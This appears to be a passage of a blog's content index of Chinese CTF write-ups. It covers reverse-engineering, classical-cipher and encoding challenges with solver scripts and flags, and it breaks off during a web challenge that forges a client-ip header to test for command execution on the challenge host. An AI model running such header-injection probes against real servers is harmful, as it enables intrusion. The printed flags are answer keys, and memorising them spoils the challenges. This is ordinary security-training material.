class=\"keyword\">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class=\"number\">64</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class=\"number\">90</span> )</span><br><span class=\"line\">\t\t\t((_BYTE *)&amp;v1 + i) = (*((<span class=\"keyword\">char</span> *)&amp;v1 + i) - <span class=\"number\">51</span>) % <span class=\"number\">26</span> + <span class=\"number\">65</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( *((_BYTE *)&amp;v1 + i) &gt; <span class=\"number\">96</span> &amp;&amp; *((_BYTE *)&amp;v1 + i) &lt;= <span class=\"number\">122</span> )</span><br><span class=\"line\">\t\t\t*((_BYTE *)&amp;v1 + i) = (*((<span class=\"keyword\">char</span> *)&amp;v1 + i) - <span class=\"number\">79</span>) % <span class=\"number\">26</span> + <span class=\"number\">97</span>;</span><br></pre></td></tr></table></figure>\n<p>写一个脚本处理：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">model = [<span class=\"number\">81</span>,<span class=\"number\">115</span>,<span class=\"number\">119</span>,<span class=\"number\">51</span>,<span class=\"number\">115</span>,<span class=\"number\">106</span>,<span class=\"number\">95</span>,<span class=\"number\">108</span>,<span class=\"number\">122</span>,<span class=\"number\">52</span>,<span class=\"number\">95</span>,<span class=\"number\">85</span>,<span class=\"number\">106</span>,<span class=\"number\">119</span>,<span class=\"number\">64</span>,<span class=\"number\">108</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = string.ascii_lowercase</span><br><span class=\"line\">s2 = string.ascii_uppercase</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> model:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i &gt; <span class=\"number\">64</span> <span class=\"keyword\">and</span> i &lt;= <span class=\"number\">90</span>:</span><br><span class=\"line\">        flag += s2[i-<span class=\"number\">14</span>-<span class=\"number\">65</span>]</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> i &gt; <span class=\"number\">96</span> <span class=\"keyword\">and</span> i &lt;= <span class=\"number\">122</span>:</span><br><span class=\"line\">        flag += s1[i-<span class=\"number\">18</span>-<span class=\"number\">97</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        flag += <span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\"><span class=\"built_in\">print</span> (<span class=\"string\">&#x27;flag&#123;&#x27;</span>+flag+<span class=\"string\">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{Cae3ar_th4_Gre@t}</del><br><em>就奇怪，我这IDA分析结果少了字符数据，就很怪</em></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://www.cnblogs.com/jentleTao/p/12642500.html\">[ACTF新生赛2020]rome</a><br>2.<a href=\"https://blog.csdn.net/weixin_46874126/article/details/108030000\">BUU_re_[ACTF新生赛2020]rome</a></p>\n","categories":["Reserve"]},{"title":"AFCTF2018-Morse","url":"/2021/08/26/AFCTF2018-Morse/","content":"<p><a href=\"\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..</span><br></pre></td></tr></table></figure>\n<p>用脚本以”/“为隔断，切割出摩斯电码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;-..../.----/-..../-..../-..../...--/--.../....-/-..../-..../--.../-.../...--/.----/--.../...--/..---/--.../--.../....-/...../..-./--.../...--/...--/-----/...../..-./...--/...--/...--/....-/...--/...../--.../----./--.../-..&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(s1.replace(<span class=\"string\">&quot;/&quot;</span>,<span class=\"string\">&quot; &quot;</span>))</span><br></pre></td></tr></table></figure>\n<p>运行脚本，就得到了：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">61666374667b317327745f73305f333435797d</span><br></pre></td></tr></table></figure>\n<p>将其包上flag提交，却提示flag错误，就怀疑是不是还有下一步操作，看看ASCII表，发现这其实是ASCII编码，将其分组解码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s1=<span class=\"string\">&quot;61666374667b317327745f73305f333435797d&quot;</span></span><br><span class=\"line\">i:<span class=\"built_in\">int</span>=<span class=\"number\">0</span></span><br><span class=\"line\">s2=[]</span><br><span class=\"line\">s3:<span class=\"built_in\">str</span>=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(s1):</span><br><span class=\"line\">    s3+=s1[i]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i%<span class=\"number\">2</span>:</span><br><span class=\"line\">        s2.append(s3)</span><br><span class=\"line\">        s3=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\">s=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> s2:</span><br><span class=\"line\">    s+=<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(letter,<span class=\"number\">16</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span> (s)</span><br></pre></td></tr></table></figure>\n<p>运行程序，得到了最终的flag。<br>flag:<del>afctf{1s’t_s0_345y}</del><br><em>记得改提交格式</em></p>\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"Alice与Bob","url":"/2021/08/26/Alice%E4%B8%8EBob/","content":"<p><a href=\"https://buuoj.cn/challenges#Alice%E4%B8%8EBob\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>网上找的代码（我实在不会）：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> randint</span><br><span class=\"line\"><span class=\"keyword\">from</span> fractions <span class=\"keyword\">import</span> gcd</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">PollardRho</span>(<span class=\"params\">n</span>):</span></span><br><span class=\"line\">    i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    b=randint(<span class=\"number\">0</span>,n-<span class=\"number\">1</span>);</span><br><span class=\"line\">    k=<span class=\"number\">2</span></span><br><span class=\"line\">    y=b</span><br><span class=\"line\">    <span class=\"keyword\">while</span> i&lt; n:</span><br><span class=\"line\">        i=i+<span class=\"number\">1</span></span><br><span class=\"line\">        b=((b^<span class=\"number\">2</span>)-<span class=\"number\">1</span>)%n</span><br><span class=\"line\">        d=gcd(y-b,n)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d!=<span class=\"number\">1</span> <span class=\"keyword\">and</span> d!=n:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(d)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i==k:</span><br><span class=\"line\">            y=b</span><br><span class=\"line\">            k=<span class=\"number\">2</span>*k</span><br></pre></td></tr></table></figure>\n<p>执行程序，得到flag。<br>flag:<del>flag(98554799767)</del></p>\n","categories":["Crypto","Base"]},{"title":"CFI-CTF 2018-IntroToPE","url":"/2021/09/12/CFI-CTF%202018-IntroToPE/","content":"<p><a href=\"\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210912091725.png\"><br>看起来是一个.NET程序，尝试使用IDA看一下结构：<br><img src=\"/images/Writeup/20210912091826.png\"><br>找一下核心函数：<br><img src=\"/images/Writeup/20210912091844.png\"><br>找一下判断逻辑，可以发现一串Base值：<br><img src=\"/images/Writeup/20210912091926.png\"><br>Base值解一下就得到了flag。<br>flag:<del>CFI{.NetC#<em>1s</em>@w3s0m3}</del></p>\n","categories":["Reserve",".NET"]},{"title":"CFI-CTF 2018-webLogon capture","url":"/2021/09/23/CFI-CTF%202018-webLogon%20capture/","content":"<p><a href=\"https://buuoj.cn/challenges#[CFI-CTF%202018]webLogon%20capture\">题目链接</a></p>\n<span id=\"more\"></span>\n\n<p>附件下载解压，得到一个流量包，并且能发现密码的值：</p>\n<p><img src=\"/images/Writeup/image-20210923234010814.png\" alt=\"image-20210923234010814\"></p>\n<p><a href=\"http://tool.chinaz.com/tools/urlencode.aspx\">UrlEncode编解码</a>直接在线转换，得到flag。</p>\n<p>flag:<del>flag{1ns3cur3_l0g0n}</del></p>\n","categories":["Misc","流量分析"]},{"title":"Cipher","url":"/2021/09/24/Cipher/","content":"<p><a href=\"https://buuoj.cn/challenges#Cipher\">题目链接</a></p>\n<span id=\"more\"></span>\n\n<p>题目没有附件，就给了一串密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dncnoqqfliqrpgeklwmppu</span><br></pre></td></tr></table></figure>\n\n<p>根据题干，找到一个在线加解密网站：<a href=\"http://rumkin.com/tools/cipher/playfair.php\">Playfair Cipher</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Alphabet Key:playfair</span><br><span class=\"line\">Tableau Used:P L A Y F</span><br><span class=\"line\">\t\t    I R B C D</span><br><span class=\"line\">\t\t    E G H K M</span><br><span class=\"line\">\t\t    N O Q S T</span><br><span class=\"line\">\t\t    U V W X Z</span><br></pre></td></tr></table></figure>\n\n<p>解密，得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Itisnotaproblemhavefun</span><br></pre></td></tr></table></figure>\n\n<p>flag:<del>flag{itisnotaproblemhavefun}</del></p>\n","categories":["Crypto"]},{"title":"CrackRTF","url":"/2021/08/29/CrackRTF/","content":"<p><a href=\"https://buuoj.cn/challenges#CrackRTF\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210829204920.png\"><br>进IDA看一下：<br><img src=\"/images/Writeup/20210829205100.png\"><br>F5逆向一下：<br><img src=\"/images/Writeup/20210829205122.png\"><br><img src=\"/images/Writeup/20210829205141.png\"><br>核心函数-main_0：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main_0</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  DWORD v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  DWORD v4; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> Str[<span class=\"number\">260</span>]; <span class=\"comment\">// [esp+4Ch] [ebp-310h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> v7; <span class=\"comment\">// [esp+150h] [ebp-20Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> String1[<span class=\"number\">260</span>]; <span class=\"comment\">// [esp+154h] [ebp-208h] BYREF</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> Destination[<span class=\"number\">260</span>]; <span class=\"comment\">// [esp+258h] [ebp-104h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(Destination, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(Destination));</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(String1, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(String1));</span><br><span class=\"line\">  v7 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pls input the first passwd(1): &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Destination);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(Destination) != <span class=\"number\">6</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Must be 6 characters!\\n&quot;</span>);</span><br><span class=\"line\">    ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v7 = atoi(Destination);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v7 &lt; <span class=\"number\">100000</span> )</span><br><span class=\"line\">    ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">strcat</span>(Destination, <span class=\"string\">&quot;@DBApp&quot;</span>);</span><br><span class=\"line\">  v3 = <span class=\"built_in\">strlen</span>(Destination);</span><br><span class=\"line\">  sub_40100A((BYTE *)Destination, v3, String1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !_strcmpi(String1, <span class=\"string\">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;continue...\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pls input the first passwd(2): &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(Str, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(Str));</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(Str) != <span class=\"number\">6</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Must be 6 characters!\\n&quot;</span>);</span><br><span class=\"line\">      ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(Str, Destination);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(String1, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(String1));</span><br><span class=\"line\">    v4 = <span class=\"built_in\">strlen</span>(Str);</span><br><span class=\"line\">    sub_401019((BYTE *)Str, v4, String1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !_strcmpi(<span class=\"string\">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !(<span class=\"keyword\">unsigned</span> __int8)sub_40100F(Str) )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error!!\\n&quot;</span>);</span><br><span class=\"line\">        ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bye ~~\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>前面为信息输出和捕捉用户输入：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v7 = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pls input the first passwd(1): &quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Destination);</span><br></pre></td></tr></table></figure>\n<p>然后是判断用户输入的数据的长度：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(Destination) != <span class=\"number\">6</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Must be 6 characters!\\n&quot;</span>);</span><br><span class=\"line\">    ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>接着判断用户输入的是不是int，以及判断大小：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v7 = atoi(Destination);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (v7 &lt; <span class=\"number\">100000</span>)</span><br><span class=\"line\">    ExitProcess(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n<p>然后合并数据：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strcat</span>(Destination, <span class=\"string\">&quot;@DBApp&quot;</span>); <span class=\"comment\">//合并&quot;@DBApp&quot;到Destination的末尾</span></span><br></pre></td></tr></table></figure>\n<p>然后获取Destination的长度，并执行sub_40100A，返回了一个String1：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v3 = <span class=\"built_in\">strlen</span>(Destination);</span><br><span class=\"line\">sub_40100A((BYTE *)Destination, v3, String1);</span><br></pre></td></tr></table></figure>\n<p>sub_40100A是一个加密函数：<br><img src=\"/images/Writeup/20210829212016.png\"><br>结合输出的密文是“6E32D0943418C2C33385BC35A1470250DD8923A9”，怀疑是SHA-1加密，嫖一个脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;@DBApp&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100000</span>,<span class=\"number\">999999</span>):</span><br><span class=\"line\">\ts = <span class=\"built_in\">str</span>(i)+flag</span><br><span class=\"line\">\tx = hashlib.sha1(s.encode())</span><br><span class=\"line\">\tcnt = x.hexdigest()</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">&quot;6e32d0943418c2c&quot;</span> <span class=\"keyword\">in</span> cnt:</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(cnt)</span><br><span class=\"line\">\t\t<span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(i)+flag)</span><br></pre></td></tr></table></figure>\n<p>得到输出的结果，也就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">123321@DBApp</span><br></pre></td></tr></table></figure>\n<p>就得到了第一段的密码：123321，并检验成功<br><img src=\"/images/Writeup/20210829212416.png\"><br>接着对String1进行对比，并执行第二段密码的校验：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!_strcmpi(String1, <span class=\"string\">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;continue...\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pls input the first passwd(2): &quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(Str, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(Str));</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(Str) != <span class=\"number\">6</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Must be 6 characters!\\n&quot;</span>);</span><br><span class=\"line\">        ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(Str, Destination);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(String1, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(String1));</span><br><span class=\"line\">    v4 = <span class=\"built_in\">strlen</span>(Str);</span><br><span class=\"line\">    sub_401019((BYTE *)Str, v4, String1);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!_strcmpi(<span class=\"string\">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!(<span class=\"keyword\">unsigned</span> __int8)sub_40100F(Str))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error!!\\n&quot;</span>);</span><br><span class=\"line\">            ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bye ~~\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>相同的逻辑，在比较完String1的数据之后，要求输入第二段密码，并进行校验：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;continue...\\n\\n&quot;</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;pls input the first passwd(2): &quot;</span>); <span class=\"comment\">//输出数据</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(Str, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(Str)); </span><br><span class=\"line\"><span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%s&quot;</span>, Str); <span class=\"comment\">//给Str开空间，并储存用户输入的第二段密码</span></span><br></pre></td></tr></table></figure>\n<p>同样，第二段密码也是6位数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(Str) != <span class=\"number\">6</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Must be 6 characters!\\n&quot;</span>);</span><br><span class=\"line\">    ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里涉及到另一段加密函数sub_401019：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">strcat</span>(Str, Destination); <span class=\"comment\">//附加Destination到Str末尾</span></span><br><span class=\"line\"><span class=\"built_in\">memset</span>(String1, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(String1)); <span class=\"comment\">//给密文开空间</span></span><br><span class=\"line\">v4 = <span class=\"built_in\">strlen</span>(Str); <span class=\"comment\">//输入数据的长度</span></span><br><span class=\"line\">sub_401019((BYTE *)Str, v4, String1); <span class=\"comment\">//加密</span></span><br></pre></td></tr></table></figure>\n<p>加密函数sub_401019：<br><img src=\"/images/Writeup/20210829213051.png\"><br>然后就是校验：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!_strcmpi(<span class=\"string\">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!(<span class=\"keyword\">unsigned</span> __int8)sub_40100F(Str))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Error!!\\n&quot;</span>);</span><br><span class=\"line\">        ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bye ~~\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>字符长度不对，不像是SHA-1了，看了一下CSDN上面的解法：</p>\n<blockquote>\n<p>接下来走第二次输入~<br>第二次输入同理，不过他把123321@DBApp加在了第二次密码的后面，并且进行加密~<br><img src=\"/images/Writeup/20210829213516.png\"><br>直接进入sub_401019函数进行查看<del>：<br><img src=\"/images/Writeup/20210829213527.png\"><br>发现大体好像差不多，不过第二个参数不同了，应该换了一种加密方式~~<br>再次查看比较字符串的长度</del><br>发现是32位的，一般来说就是MD5了<br>不过什么提示都没有，，，我怎么进行爆破啊<br>6位全字符，这得爆破到一年，，，，陷入迷惘！！！<br>先继续往下走走看~<br>发现if里面还有一个函数~<br>进入到这个比较中的sub_40100F函数看看！！<br><img src=\"/images/Writeup/20210829213537.png\"><br>看到内容如下，应该是从一个AAA的东西里面取出数据，<br>然后将从AAA中取出的数据和我们传入的参数——也就是输入的第二次密码连接后的字符串<br>传入一个sub_401005函数<br>最后生成一个dbapp.rtf文件，看到这想起了题目的RTF~<br>这个函数应该有东西~<br><img src=\"/images/Writeup/20210829213552.png\"><br>进入sub_401005函数查看一下，<br>就是将我们从AAA取出的值和第二次密码连接后的字符串进行异或嘛：<br><img src=\"/images/Writeup/20210829213559.png\"><br>不过从AAA中的值不知道，，，，</p>\n</blockquote>\n<p>其实这里AAA就是RTF文件的文件头（前六位），对此构建脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">&quot;&#123;\\rtf1&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = [<span class=\"number\">0x05</span>,<span class=\"number\">0x7D</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0x15</span>,<span class=\"number\">0x26</span>,<span class=\"number\">0x01</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(s)):</span><br><span class=\"line\">\tx = <span class=\"built_in\">ord</span>(s[i]) ^ a[i]</span><br><span class=\"line\">\tflag += <span class=\"built_in\">chr</span>(x)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>得到第二段密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">~!3a@0</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/Writeup/20210829213757.png\"><br>然后就在程序的同级目录下发现dbapp.rtf这个文件，打开就是flag。<br>flag<del>Flag{N0_M0re_Free_Bugs}</del></p>\n<hr>\n<p>参考：<a href=\"https://blog.csdn.net/qq_42967398/article/details/96492843\">BUUCTF Reverse CrackRTF</a></p>\n","categories":["Reserve"]},{"title":"BJDCTF2020-The mystery of ip","url":"/2021/09/01/BJDCTF2020-The%20mystery%20of%20ip/","content":"<p><a href=\"https://buuoj.cn/challenges#[BJDCTF2020]The%20mystery%20of%20ip\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>我分配到的主机是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://node4.buuoj.cn:26758</span><br></pre></td></tr></table></figure>\n<p>打开链接，发现是静态页面，没啥想法，翻翻看看：<br><img src=\"/images/Writeup/20210908111447.png\"><br><img src=\"/images/Writeup/20210908111457.png\"><br><img src=\"/images/Writeup/20210908111510.png\"><br>用[[Burp Suite)看一下：<br><img src=\"/images/Writeup/20210908111538.png\"><br>怀疑是请求头读取，尝试构造Request：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /flag.php HTTP/1.1</span><br><span class=\"line\">Host: node4.buuoj.cn:26758</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://node4.buuoj.cn:26758/hint.php</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">client-ip:&#123;75&#125;</span><br><span class=\"line\">Connection: close</span><br></pre></td></tr></table></figure>\n<p>发现读取到的ip确实显示成75了，尝试一下看看能不能执行指令：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">GET /flag.php HTTP/1.1</span><br><span class=\"line\">Host: node4.buuoj.cn:26758</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Referer: http://node4.buuoj.cn:26758/hint.php</span><br><span 